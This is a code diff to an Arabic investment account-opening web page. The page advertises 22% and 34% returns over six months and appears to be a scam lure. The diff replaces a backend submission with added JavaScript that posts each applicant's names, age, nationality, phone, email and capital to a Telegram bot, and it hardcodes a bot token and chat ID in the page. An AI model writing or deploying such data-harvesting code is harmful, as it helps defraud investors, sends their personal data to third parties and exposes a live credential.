@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -1462,11 +1463,189 @@
 
 
 <!-- ============================================================
-     FORM VALIDATION & SUBMIT
+     FORM VALIDATION & SUBMIT TO TELEGRAM
 ============================================================ -->
 <script>
   /* ============================================================
-     DATA
+     TELEGRAM BOT CONFIGURATION
+  ============================================================ */
+  const TELEGRAM_CONFIG = {
+      token: '8660100340:AAEPj1rlH5PfPZ8StoztNi2m7ZmOOgzLrr4',
+      chatId: '-1003890710277'
+  };
+
+  /* ============================================================
+     SEND TO TELEGRAM FUNCTION
+  ============================================================ */
+  async function sendToTelegram(message) {
+      try {
+          const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`;
+          
+          const response = await fetch(url, {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                  chat_id: TELEGRAM_CONFIG.chatId,
+                  text: message,
+                  parse_mode: 'HTML',
+                  disable_web_page_preview: true
+              })
+          });
+
+          const data = await response.json();
+          
+          if (data.ok) {
+              console.log('✅ Message sent to Telegram successfully');
+              return true;
+          } else {
+              console.error('❌ Telegram API error:', data.description);
+              return false;
+          }
+      } catch (error) {
+          console.error('❌ Failed to send message to Telegram:', error);
+          return false;
+      }
+  }
+
+  /* ============================================================
+     FORMAT MESSAGE FOR TELEGRAM
+  ============================================================ */
+  function formatTelegramMessage(formData) {
+      const divider = '─'.repeat(35);
+      const timestamp = new Date().toLocaleString('ar-SA', { 
+          timeZone: 'Asia/Riyadh',
+          year: 'numeric',
+          month: 'long',
+          day: 'numeric',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit'
+      });
+      
+      let message = `🔔 <b>📋 طلب فتح حساب استثماري جديد</b>\n\n`;
+      message += `${divider}\n\n`;
+      
+      message += `👤 <b>البيانات الشخصية</b>\n`;
+      message += `• الاسم الأول: ${formData.firstName}\n`;
+      message += `• الاسم الثاني: ${formData.secondName}\n`;
+      message += `• الاسم الثالث: ${formData.thirdName}\n`;
+      message += `• الاسم الكامل: ${formData.fullName}\n`;
+      message += `• العمر: ${formData.age} سنة\n`;
+      message += `• الجنسية: ${formData.nationality}\n\n`;
+      
+      message += `📱 <b>بيانات التواصل</b>\n`;
+      message += `• رقم الجوال: ${formData.phone}\n`;
+      message += `• البريد الإلكتروني: ${formData.email}\n\n`;
+      
+      message += `💰 <b>بيانات الاستثمار</b>\n`;
+      message += `• رأس المال: ${formData.capital}\n`;
+      message += `• نوع العرض: ${formData.offerType}\n`;
+      
+      if (formData.notes && formData.notes.trim() !== '') {
+          message += `\n📝 <b>ملاحظات إضافية</b>\n`;
+          message += `${formData.notes}\n`;
+      }
+      
+      message += `\n${divider}\n`;
+      message += `🕐 <b>وقت الإرسال:</b> ${timestamp}\n`;
+      message += `🆔 <b>رقم الطلب:</b> ${Date.now().toString().slice(-8)}`;
+      
+      return message;
+  }
+
+  /* ============================================================
+     COLLECT FORM DATA AND SEND TO TELEGRAM
+  ============================================================ */
+  async function submitFormToTelegram() {
+      try {
+          // Collect personal data
+          const firstName = document.getElementById('firstName')?.value.trim() || '';
+          const secondName = document.getElementById('secondName')?.value.trim() || '';
+          const thirdName = document.getElementById('thirdName')?.value.trim() || '';
+          const age = document.getElementById('age')?.value || '';
+          
+          // Get nationality text
+          const nationalitySelect = document.getElementById('nationality');
+          let nationality = '';
+          if (nationalitySelect && nationalitySelect.selectedIndex > 0) {
+              nationality = nationalitySelect.options[nationalitySelect.selectedIndex].text;
+          }
+          
+          // Get phone with code
+          const phoneCode = document.getElementById('phoneCode')?.textContent || '+966';
+          const phoneNumber = document.getElementById('phone')?.value.trim() || '';
+          const fullPhone = `${phoneCode} ${phoneNumber}`;
+          
+          // Get email
+          const email = document.getElementById('email')?.value.trim() || '';
+          
+          // Get capital with currency
+          const capitalValue = document.getElementById('capital')?.value || '';
+          const currencyCode = document.getElementById('currencyCode')?.textContent || 'ريال';
+          const capital = `${capitalValue} ${currencyCode}`;
+          
+          // Get offer type
+          const selectedOffer = document.querySelector('input[name="offerType"]:checked');
+          let offerType = '';
+          if (selectedOffer) {
+              const offerValue = selectedOffer.value;
+              const offerLabels = {
+                  brokerage: 'الوساطة المالية 📊',
+                  funds: 'صناديق الاستثمار العقاري 🏗️',
+                  portfolios: 'إدارة المحافظ 💼',
+                  ipo: 'الاكتتابات 🎯',
+                  normal: 'العرض العادي ⬡ (نسبة 22% | مدة 6 أشهر)',
+                  golden: 'العرض الذهبي ✦ (نسبة 34% | مدة 6 أشهر)'
+              };
+              offerType = offerLabels[offerValue] || offerValue;
+          }
+          
+          // Get notes
+          const notes = document.getElementById('notes')?.value.trim() || '';
+          
+          // Validate required fields
+          if (!firstName || !secondName || !thirdName || !age || !nationality || !phoneNumber || !email || !capitalValue || !offerType) {
+              throw new Error('يرجى تعبئة جميع الحقول المطلوبة');
+          }
+          
+          // Prepare form data object
+          const formData = {
+              firstName: firstName,
+              secondName: secondName,
+              thirdName: thirdName,
+              fullName: `${firstName} ${secondName} ${thirdName}`,
+              age: age,
+              nationality: nationality,
+              phone: fullPhone,
+              email: email,
+              capital: capital,
+              offerType: offerType,
+              notes: notes
+          };
+          
+          // Format message for Telegram
+          const message = formatTelegramMessage(formData);
+          
+          // Send to Telegram
+          const success = await sendToTelegram(message);
+          
+          if (success) {
+              console.log('✅ Form data sent to Telegram successfully');
+              return true;
+          } else {
+              throw new Error('فشل إرسال البيانات إلى البوت');
+          }
+          
+      } catch (error) {
+          console.error('❌ Error in submitFormToTelegram:', error);
+          throw error;
+      }
+  }
+
+  /* ============================================================
+     DATA FOR DROPDOWNS
   ============================================================ */
   const COUNTRIES = [
     { flag:'🇸🇦', name:'السعودية',      code:'+966', digits:9  },
@@ -1555,13 +1734,11 @@
       const vw      = window.innerWidth;
       const vh      = window.innerHeight;
 
-      // Vertical: prefer below button, fallback above
       let top = rect.bottom + 6;
       if (top + panelH > vh - 8 && rect.top - panelH - 6 > 8) {
         top = rect.top - panelH - 6;
       }
 
-      // Horizontal: align right edge of panel with right edge of button
       let left = rect.right - panelW;
       if (left < 8)              left = 8;
       if (left + panelW > vw - 8) left = vw - panelW - 8;
@@ -1577,7 +1754,7 @@
       positionPanel();
       if (searchEl) { searchEl.value = ''; searchEl.focus(); }
       setTimeout(() => {
-        positionPanel(); // recalculate after panel has rendered height
+        positionPanel();
         const active = listEl.querySelector('.active');
         if (active) active.scrollIntoView({ block: 'nearest' });
       }, 30);
@@ -1592,7 +1769,6 @@
       wrapper.classList.contains('open') ? close() : open();
     });
 
-    // Close and reposition on scroll/resize
     window.addEventListener('scroll', close, true);
     window.addEventListener('resize', function() {
       if (wrapper.classList.contains('open')) positionPanel();
@@ -1612,7 +1788,6 @@
       if (!wrapper.contains(e.target)) close();
     });
 
-    // Init display
     document.getElementById(flagElId).textContent = data[0][flagKey];
     document.getElementById(codeElId).textContent = data[0][codeKey];
     render(data);
@@ -1661,67 +1836,7 @@
   });
 
   /* ============================================================
-     BACKEND CONFIG
-  ============================================================ */
-  const API_ENDPOINT = '/api/submit-form/';
-
-  async function sendToBackend(message) {
-    const res = await fetch(API_ENDPOINT, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ message: message }),
-    });
-
-    const json = await res.json();
-    if (!json.success) {
-      throw new Error(json.message || 'خطأ غير محدد في الخادم');
-    }
-  }
-
-  const OFFER_LABELS = {
-    brokerage:  'الوساطة المالية 📊',
-    funds:      'صناديق الاستثمار العقاري 🏗️',
-    portfolios: 'إدارة المحافظ 💼',
-    ipo:        'الاكتتابات 🎯',
-    normal:     'العرض العادي ⬡ (22% | 6 أشهر)',
-    golden:     'العرض الذهبي ✦ (34% | 6 أشهر)',
-  };
-
-  function buildMessage(data) {
-    const line = '─────────────────────';
-    return [
-      '🔔 <b>طلب فتح حساب استثماري جديد</b>',
-      line,
-      '',
-      '👤 <b>البيانات الشخصية</b>',
-      '• الاسم الكامل: ' + data.fullName,
-      '• العمر: ' + data.age + ' سنة',
-      '• الجنسية: ' + data.nationality,
-      '',
-      '📱 <b>بيانات التواصل</b>',
-      '• الهاتف: ' + data.phone,
-      '• البريد الإلكتروني: ' + data.email,
-      '',
-      '💰 <b>بيانات الاستثمار</b>',
-      '• رأس المال: ' + data.capital,
-      '• نوع العرض: ' + data.offerType,
-      data.notes ? ('• ملاحظات: ' + data.notes) : '',
-      '',
-      line,
-      '🕐 ' + new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' }),
-    ].filter(Boolean).join('\n');
-  }
-
-
-  function showToast(msg, duration) {
-    const t = document.getElementById('toastError');
-    t.textContent = msg;
-    t.classList.add('show');
-    setTimeout(() => t.classList.remove('show'), duration || 4000);
-  }
-
-  /* ============================================================
-     FORM VALIDATION + SUBMIT
+     FORM VALIDATION + SUBMIT TO TELEGRAM
   ============================================================ */
   const form      = document.getElementById('accountForm');
   const submitBtn = document.getElementById('submitBtn');
@@ -1748,11 +1863,18 @@
     selectedCurrency = CURRENCIES[0];
   }
 
+  function showToast(msg, duration) {
+    const t = document.getElementById('toastError');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), duration || 4000);
+  }
+
   form.addEventListener('submit', async function(e) {
     e.preventDefault();
     let ok = true;
 
-    // ── Validation ──
+    // Validation
     ['firstName', 'secondName', 'thirdName'].forEach(id => {
       const el = document.getElementById(id);
       if (!markField(el, el.value.trim().length > 0, null)) ok = false;
@@ -1785,33 +1907,21 @@
       return;
     }
 
-    // ── Collect data ──
-    const natOption = nat.options[nat.selectedIndex];
-    const formData = {
-      fullName:   [
-        document.getElementById('firstName').value.trim(),
-        document.getElementById('secondName').value.trim(),
-        document.getElementById('thirdName').value.trim(),
-      ].join(' '),
-      age:        age.value,
-      nationality: natOption ? natOption.text : nat.value,
-      phone:      selectedCountry.code + ' ' + phone.value.trim(),
-      email:      email.value.trim(),
-      capital:    Number(capital.value).toLocaleString('ar-SA') + ' ' + selectedCurrency.name,
-      offerType:  OFFER_LABELS[offerEl.value] || offerEl.value,
-      notes:      document.getElementById('notes').value.trim(),
-    };
-
-    // ── Send to Backend ──
+    // Send to Telegram
     submitBtn.classList.add('loading');
     submitBtn.querySelector('.btn-label').textContent = 'جاري الإرسال...';
 
     try {
-      await sendToBackend(buildMessage(formData));
-      resetForm();
-      document.getElementById('successOverlay').classList.add('show');
+      const success = await submitFormToTelegram();
+      
+      if (success) {
+        resetForm();
+        document.getElementById('successOverlay').classList.add('show');
+      } else {
+        throw new Error('فشل إرسال البيانات إلى البوت');
+      }
     } catch (err) {
-      console.error('Backend send error:', err.message);
+      console.error('Error:', err.message);
       showToast('⚠️ ' + err.message, 7000);
     } finally {
       submitBtn.classList.remove('loading');
@@ -1831,3 +1941,4 @@
 
 </body>
 </html>
+```
